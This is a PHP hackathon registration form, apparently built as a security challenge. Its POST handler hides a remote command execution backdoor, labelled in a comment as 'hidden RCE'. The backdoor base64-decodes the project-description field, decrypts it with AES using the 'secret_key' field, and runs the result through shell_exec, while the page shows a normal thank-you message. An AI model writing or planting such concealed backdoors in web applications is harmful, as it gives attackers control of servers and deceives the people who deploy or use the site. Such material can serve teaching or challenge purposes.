<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $project = $_POST['project'];
    $secret_key = $_POST['secret_key'];
    
    // Enhanced hidden RCE functionality with increased difficulty
    if (isset($_POST['project']) && !empty($_POST['project']) && isset($_POST['secret_key'])) {
        $encoded_input = base64_decode($project);
        $key = hash('sha256', $secret_key);
        $filtered_input = preg_replace('/[^a-zA-Z0-9\s]/', '', $encoded_input);
        $command = openssl_decrypt($filtered_input, 'AES-256-CBC', $key, 0, substr($key, 0, 16));
        if ($command !== false) {
            $output = shell_exec($command);
        }
    }
    
    // Simulating registration process
    $success = "Thank you for registering, $name! Your project has been submitted.";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hackathon Registration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f4f4f4;
        }
        h2 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 30px;
        }
        form {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"],
        input[type="email"],
        input[type="password"],
        textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        textarea {
            height: 100px;
            resize: vertical;
        }
        input[type="submit"] {
            background-color: #3498db;
            color: #fff;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #2980b9;
        }
        .success {
            background-color: #2ecc71;
            color: #fff;
            padding: 10px;
            border-radius: 4px;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<h2>Hackathon Registration</h2>
<form method="POST" action="">
    <label for="name">Name:</label>
    <input type="text" id="name" name="name" required><br><br>
    
    <label for="email">Email:</label>
    <input type="email" id="email" name="email" required><br><br>
    
    <label for="project">Project Description:</label>
    <textarea id="project" name="project" required></textarea><br><br>
    
    <label for="secret_key">Secret Key:</label>
    <input type="password" id="secret_key" name="secret_key"><br><br>
    
    <input type="submit" value="Register">
</form>

<?php
if (isset($success)) {
    echo "<p>$success</p>";
}
?>






